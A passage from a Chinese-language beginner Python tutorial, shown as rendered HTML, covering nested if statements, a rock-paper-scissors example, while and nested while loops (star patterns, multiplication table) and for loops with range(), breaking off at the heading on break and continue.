满足条件<span class="number">1</span>时可以做的事情</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> 条件<span class="number">2</span>:</span><br><span class="line">        满足条件<span class="number">2</span>时可以做的事情</span><br><span class="line">        满足条件<span class="number">2</span>时可以做的事情</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>说明</p><ul><li>外层<code>if</code>与内层<code>if</code>至于是3种<code>if</code>判断的哪一种都是可以的，根据实际情况来决定</li></ul><h5 id="示例代码-2"><a href="#示例代码-2" class="headerlink" title="示例代码"></a>示例代码</h5><p>外层是<code>if...else...</code>内层也是<code>if...else...</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ticket = <span class="literal">True</span> <span class="comment"># 用True代表有车票，False代表没有车票</span></span><br><span class="line">knife_lenght = <span class="number">9</span>  <span class="comment"># 刀子的长度，单位为cm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ticket == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;有车票，可以进站&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> knife_lenght &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;通过安检&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;终于可以见到Ta了，美滋滋~~~&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有通过安检&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;刀子的长度超过规定，等待警察处理...&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有车票，不能进站&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;亲爱的，那就下次见了&quot;</span>)</span><br></pre></td></tr></table></figure><p>结果一：<code>ticket = True   knife_lenght = 9</code></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">有车票，可以进站</span><br><span class="line">通过安检</span><br><span class="line">终于可以见到Ta了，美滋滋~~~</span><br></pre></td></tr></table></figure><p>结果二：<code>ticket = True   knife_lenght = 20</code></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">有车票，可以进站</span><br><span class="line">没有通过安检</span><br><span class="line">刀子的长度超过规定，等待警察处理...</span><br></pre></td></tr></table></figure><p>结果三：<code>ticket = False   knife_lenght = 9</code></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">没有车票，不能进站</span><br><span class="line">亲爱的，那就下次见了</span><br></pre></td></tr></table></figure><p>结果四：<code>ticket = False   knife_lenght = 20</code></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">没有车票，不能进站</span><br><span class="line">亲爱的，那就下次见了</span><br></pre></td></tr></table></figure><p><strong>想一想:</strong></p><p>为什么<code>结果三</code>和<code>结果四</code>相同？？？</p><h5 id="随堂练习-2"><a href="#随堂练习-2" class="headerlink" title="随堂练习"></a>随堂练习</h5><p>情节描述：上公交车，并且可以有座位坐下</p><p>要求：输入公交卡当前的余额，只要超过2元，就可以上公交车；如果车上有空座位，就可以坐下</p><p>请编写代码实现上述要求</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">money = <span class="built_in">input</span>(<span class="string">&quot;your left money:&quot;</span>)</span><br><span class="line">seat = <span class="number">1</span></span><br><span class="line">money = <span class="built_in">int</span>(money)</span><br><span class="line"><span class="keyword">if</span> money &gt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;money is ok&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> seat &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="if-代码案例"><a href="#if-代码案例" class="headerlink" title="if 代码案例"></a>if 代码案例</h2><h5 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">player = <span class="built_in">input</span>(<span class="string">&#x27;请输入：剪刀(0)  石头(1)  布(2):&#x27;</span>)</span><br><span class="line">player = <span class="built_in">int</span>(player)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个随机整数：0、1、2 中的某一个</span></span><br><span class="line">computer = random.randint(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line"><span class="comment">#用到random模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用来进行测试</span></span><br><span class="line"><span class="comment">#print(&#x27;player=%d,computer=%d&#x27;,(player,computer))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((player == <span class="number">0</span>) <span class="keyword">and</span> (computer == <span class="number">2</span>)) <span class="keyword">or</span> ((player == <span class="number">1</span>) <span class="keyword">and</span> (computer == <span class="number">0</span>)) <span class="keyword">or</span> ((player == <span class="number">2</span>) <span class="keyword">and</span> (computer == <span class="number">1</span>)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;获胜，哈哈，你太厉害了&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> player == computer:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;平局，要不再来一局&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;输了，不要走，洗洗手接着来，决战到天亮&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><h2 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h2><h5 id="引入-5"><a href="#引入-5" class="headerlink" title="引入"></a>引入</h5><p>不知道大家是否喜欢下象棋，反正楼下大爷还是挺喜欢的~</p><p>如果这盘棋下完了，可以收拾一下接着重来一局，这重来一局说到底就是重复</p><p>软件中也是需要这样的功能的，像打游戏（这个大家都有经验就不过多说了）时这局没吃到”鸡”，可以再重新玩一局对嘛，这也是重复</p><p>程序中的重复执行功能是怎样实现的呢？</p><p>答：循环</p><h5 id="软件中循环的使用场景"><a href="#软件中循环的使用场景" class="headerlink" title="软件中循环的使用场景"></a>软件中循环的使用场景</h5><p>跟媳妇承认错误，说一万遍”媳妇，我错了”</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;媳妇，我错了&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;媳妇，我错了&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;媳妇，我错了&quot;</span>)</span><br><span class="line">...(还有<span class="number">9997</span>遍)...</span><br></pre></td></tr></table></figure><p>使用循环语句一句话搞定：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">10000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;媳妇儿，我错了&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><h5 id="Python-中的循环方式"><a href="#Python-中的循环方式" class="headerlink" title="Python 中的循环方式"></a>Python 中的循环方式</h5><p>Python中只有2种循环执行代码的方式</p><ul><li><code>while</code>循环</li><li><code>for</code>循环</li></ul><p><strong>tips：</strong></p><blockquote><p>学过其它编程语言的同学请注意，Python中没有do-while循环，只有while和for</p></blockquote><h5 id="while-循环的使用"><a href="#while-循环的使用" class="headerlink" title="while 循环的使用"></a>while 循环的使用</h5><p>代码格式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件:</span><br><span class="line">    条件满足时，做的事情<span class="number">1</span></span><br><span class="line">    条件满足时，做的事情<span class="number">2</span></span><br><span class="line">    条件满足时，做的事情<span class="number">3</span></span><br><span class="line">    ...(省略)...</span><br></pre></td></tr></table></figure><p>小提示：当前代码的执行顺序可以使用Pycharm中的Debug模式进行代码单步执行</p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;当前是第%d次执行循环&quot;</span> % (i + <span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i=%d&quot;</span> % i)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前是第1次执行循环</span><br><span class="line">i=0</span><br><span class="line">当前是第2次执行循环</span><br><span class="line">i=1</span><br><span class="line">当前是第3次执行循环</span><br><span class="line">i=2</span><br><span class="line">当前是第4次执行循环</span><br><span class="line">i=3</span><br><span class="line">当前是第5次执行循环</span><br><span class="line">i=4</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>先判断<code>i &lt; 5</code>条件是否为<code>真</code>，此时<code>i </code>为0所以，<code>i &lt; 5</code>结果为<code>真</code></li><li>接下来执行2个<code>print</code>语句，然后执行<code>i+=1</code>，此时<code>i</code>变成了1</li><li>再执行<code>i &lt; 5</code>此时相当于<code>1 &lt; 5</code>结果为<code>True</code>，所以继续执行2次<code>print</code>，接下来i变为2。剩下的就是重复的过程了，我们不再赘述</li><li>当执行<code>i += 1</code>后<code>i</code>的值为5的时候，接下来执行<code>while  i &lt; 5</code>此时<code>i &lt; 5</code>结果为<code>假</code>，所以while条件不满足，此时<code>while</code>循环结束</li></ul><h5 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h5><ul><li><code>while</code>和<code>if</code>的用法基本类似，区别在于：<code>if </code>条件成立，则执行一次；<code>while</code>条件成立，则重复执行，直到条件不成立为止。</li><li>一般情况下，需要多次重复执行的代码，都可以用循环的方式来完成</li><li>循环不是必须要使用的，但是为了提高代码的重复使用率，所以有经验的开发者都会采用循环</li></ul><h2 id="while-循环应用"><a href="#while-循环应用" class="headerlink" title="while 循环应用"></a>while 循环应用</h2><h5 id="代码难度等级：简单"><a href="#代码难度等级：简单" class="headerlink" title="代码难度等级：简单"></a>代码难度等级：简单</h5><p>应用一：</p><p>要求：计算1~100的累积和（包含1和100）</p><p>参考代码如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line">sum_ret = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">100</span>:</span><br><span class="line">    sum_ret = sum_ret + i</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1~100的累积和为:%d&quot;</span> % sum_ret)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>应用二：</p><p>要求：计算1~100之间偶数的累积和（包含1和100）</p><p>参考代码如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line">sum_ret = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">100</span>:</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        sum_ret = sum_ret + i</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1~100之间偶数和为:%d&quot;</span> % sum_ret)</span><br></pre></td></tr></table></figure><h5 id="代码难度等级：较难"><a href="#代码难度等级：较难" class="headerlink" title="代码难度等级：较难"></a>代码难度等级：较难</h5><p>应用三：</p><p>要求：实现计算1~100之间能被3整除且能够7整除的所有数之和</p><p>参考代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line">sum_ret = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">100</span>:</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">7</span> == <span class="number">0</span>:  <span class="comment"># 在这里进行判断 是否是满足 被3整除且能够7整除</span></span><br><span class="line">        sum_ret = sum_ret + i</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1~100之间能被3整除且能够7整除的所有数之和:%d&quot;</span> % sum_ret)</span><br></pre></td></tr></table></figure><p>应用四：</p><p>要求：使用while循环编写代码试如下效果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1---&gt;1</span><br><span class="line">2---&gt;4</span><br><span class="line">3---&gt;9</span><br><span class="line">4---&gt;16</span><br><span class="line">5---&gt;25</span><br></pre></td></tr></table></figure><p>参考代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%d---&gt;%d&quot;</span> % (i, i*i))</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="while-循环嵌套"><a href="#while-循环嵌套" class="headerlink" title="while 循环嵌套"></a>while 循环嵌套</h2><h5 id="引入-6"><a href="#引入-6" class="headerlink" title="引入"></a>引入</h5><p>想一想：<code>while</code>循环可以将原本写多遍重复的代码改成只写1遍，从而提高了代码的复用性；那如果在一次while循环的过程中有多个重复的功能要执行，该怎么办呢？</p><p>为了更好理解这个问题，看如下代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我是顾安老师，你好吗&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我很好，谢谢你的课程&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我学到了很多&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我是顾安老师，你好吗&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我很好，谢谢你的课程&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我学到了很多&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我是顾安老师，你好吗&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我很好，谢谢你的课程&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我学到了很多&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br></pre></td></tr></table></figure><p>发现上述的代码，整体来说是重复的，可以用while进行升级，代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是顾安老师，你好吗&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我很好，谢谢你的课程&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我学到了很多&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;哈哈&quot;</span>)</span><br></pre></td></tr></table></figure><p>上述的代码确实有了很大的提升，代码量减少了很多很多，但 这还不够，仔细观察会发现 <code>print(&quot;哈哈&quot;)</code>重复了4次</p><p>这个问题就是上面我们提到的在while循环过程中又出现了重复的代码的问题，想想看改怎么解决？</p><p>答：while循环嵌套</p><h5 id="while-嵌套代码示例"><a href="#while-嵌套代码示例" class="headerlink" title="while 嵌套代码示例"></a>while 嵌套代码示例</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件<span class="number">1</span>:</span><br><span class="line">    条件<span class="number">1</span>满足时做的事情<span class="number">1</span></span><br><span class="line">    条件<span class="number">1</span>满足时做的事情<span class="number">2</span></span><br><span class="line">    条件<span class="number">1</span>满足时做的事情<span class="number">3</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">while</span> 条件<span class="number">2</span>:</span><br><span class="line">        条件<span class="number">2</span>满足时做的事情<span class="number">1</span></span><br><span class="line">        条件<span class="number">2</span>满足时做的事情<span class="number">2</span></span><br><span class="line">        条件<span class="number">2</span>满足时做的事情<span class="number">3</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>while循环嵌套运行时的特点：每次外层循环执行1次，内层循环执行全部</li><li>while循环嵌套可以无限次的嵌套，但<strong>一般情况下不超过3层while循环嵌套</strong></li><li>当外层while条件不满足时表示整个while循环嵌套结束</li></ul><h5 id="while-嵌套实际应用"><a href="#while-嵌套实际应用" class="headerlink" title="while 嵌套实际应用"></a>while 嵌套实际应用</h5><p>示例一：</p><p>要求：打印如下图形</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">*</span><br><span class="line">* *</span><br><span class="line">* * *</span><br><span class="line">* * * *</span><br><span class="line">* * * * *</span><br></pre></td></tr></table></figure><p>参考代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">5</span>:</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt;= i:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* &quot;</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>示例二：</p><p>要求：打印如下图形</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">X*Y=Z</span><br><span class="line"></span><br><span class="line">X*Y=Z X*Y=Z</span><br><span class="line"></span><br><span class="line">X*Y=Z X*Y=Z X*Y=Z</span><br><span class="line"></span><br><span class="line">X*Y=Z X*Y=Z X*Y=Z X*Y=Z</span><br><span class="line"></span><br><span class="line">X*Y=Z X*Y=Z X*Y=Z X*Y=Z X*Y=Z</span><br></pre></td></tr></table></figure><p>参考代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">5</span>:</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt;= i:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;X*Y=Z &quot;</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>示例三：</p><p>要求：打印如下图形</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1*1=Z</span><br><span class="line"></span><br><span class="line">1*2=Z 2*2=Z</span><br><span class="line"></span><br><span class="line">1*3=Z 2*3=Z 3*3=Z</span><br><span class="line"></span><br><span class="line">1*4=Z 2*4=Z 3*4=Z 4*4=Z</span><br><span class="line"></span><br><span class="line">1*5=Z 2*5=Z 3*5=Z 4*5=Z 5*5=Z</span><br></pre></td></tr></table></figure><p>参考代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">5</span>:</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt;= i:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%d*%d=Z &quot;</span> % (j, i), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>示例四：</p><p>要求：打印如下图形</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1*1=1</span><br><span class="line"></span><br><span class="line">1*2=2 2*2=4</span><br><span class="line"></span><br><span class="line">1*3=3 2*3=6 3*3=9</span><br><span class="line"></span><br><span class="line">1*4=4 2*4=8 3*4=12 4*4=16</span><br><span class="line"></span><br><span class="line">1*5=5 2*5=10 3*5=15 4*5=20 5*5=25</span><br><span class="line"></span><br><span class="line">1*6=6 2*6=12 3*6=18 4*6=24 5*6=30 6*6=36</span><br><span class="line"></span><br><span class="line">1*7=7 2*7=14 3*7=21 4*7=28 5*7=35 6*7=42 7*7=49</span><br><span class="line"></span><br><span class="line">1*8=8 2*8=16 3*8=24 4*8=32 5*8=40 6*8=48 7*8=56 8*8=64</span><br><span class="line"></span><br><span class="line">1*9=9 2*9=18 3*9=27 4*9=36 5*9=45 6*9=54 7*9=63 8*9=72 9*9=81</span><br></pre></td></tr></table></figure><p>参考代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">line_num = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> line_num &lt;= <span class="number">9</span>:</span><br><span class="line">    row_num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> row_num &lt;= line_num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%d*%d=%d &quot;</span> % (row_num,line_num,line_num*row_num), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        row_num += <span class="number">1</span></span><br><span class="line">    line_num +=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h2><h3 id="引入-7"><a href="#引入-7" class="headerlink" title="引入"></a>引入</h3><p>像<code>while</code>循环一样，<code>for</code>可以完成循环的功能</p><p><code>for</code>循环可以遍历任何序列的项目，如一个列表或者一个字符串等</p><p><strong>注意</strong>：</p><ul><li><code>for</code>循环使用最多的场景是直接遍历可以迭代的对象，而什么是迭代，什么是对象我们还没有学习，因此本节课程只讲解简单的使用<code>for</code>。更为复杂的用法在后面讲解</li></ul><h3 id="for-循环代码格式"><a href="#for-循环代码格式" class="headerlink" title="for 循环代码格式"></a>for 循环代码格式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 列表或者字符串等可迭代对象:</span><br><span class="line">    循环满足条件时执行的代码</span><br></pre></td></tr></table></figure><h3 id="for-循环代码示例"><a href="#for-循环代码示例" class="headerlink" title="for 循环代码示例"></a>for 循环代码示例</h3><p>如果想要循环输出0、1、2、3、4，使用<code>for</code>循环来实现的代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h3 id="range-内置函数的简单使用"><a href="#range-内置函数的简单使用" class="headerlink" title="range 内置函数的简单使用"></a>range 内置函数的简单使用</h3><p><code>range()</code>的功能很强大，此时我们只需要知道它可以配合for实现循环即可，其他的功能在后面的课程中学习</p><p>给出range类的说明，</p><blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">range</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    range(stop) -&gt; range object</span></span><br><span class="line"><span class="string">    range(start, stop[, step]) -&gt; range object</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Return an object that produces a sequence of integers from start (inclusive)</span></span><br><span class="line"><span class="string">    to stop (exclusive) by step.  range(i, j) produces i, i+1, i+2, ..., j-1.</span></span><br><span class="line"><span class="string">    start defaults to 0, and stop is omitted!  range(4) produces 0, 1, 2, 3.</span></span><br><span class="line"><span class="string">    These are exactly the valid indices for a list of 4 elements.</span></span><br><span class="line"><span class="string">    When step is given, it specifies the increment (or decrement).</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><ul><li><p><code>range(x)</code></p><p>  当range中只有1个数字时，for循环取到的数据是0….x-1</p><p>  例如：</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>  能输出：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>  但不能输出5</p></li><li><p><code>range(x, y)</code></p><p>  当range中有2个数字时，此时for循环取到的数据是x….y-1</p><p>  例如：</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>  能输出：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure></li><li><p><code>range(x, y, z)</code></p><p>  当range中有3个数字时，此时for循环能取到的数据是从x…y-1但是每次间隔的数据是z</p><p>  <strong>示例一：</strong></p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>  <strong>示例二：</strong></p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>  <strong>示例三：</strong></p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>  运行结果：注意一点细微的区别，从5–&gt;1，每次-1，到1前面一个数字2停止~~~</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">4</span><br><span class="line">3</span><br><span class="line">2</span><br></pre></td></tr></table></figure></li></ul><h3 id="for-循环案例"><a href="#for-循环案例" class="headerlink" title="for 循环案例"></a>for 循环案例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sum_ret = <span class="number">0</span>  <span class="comment"># 用来存储总和</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    sum_ret += i</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1~100的和为:%d&quot;</span> % sum_ret)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>~<span class="number">100</span>的和为:<span class="number">5050</span></span><br></pre></td></tr></table></figure><h2 id="break-与-continue"><a href="#break-与-continue" class="headerlink" title="break 与 continue"></a>break 与 continue</h2><h5 id="引入-8"><a href="#引入-8" class="headerlink" 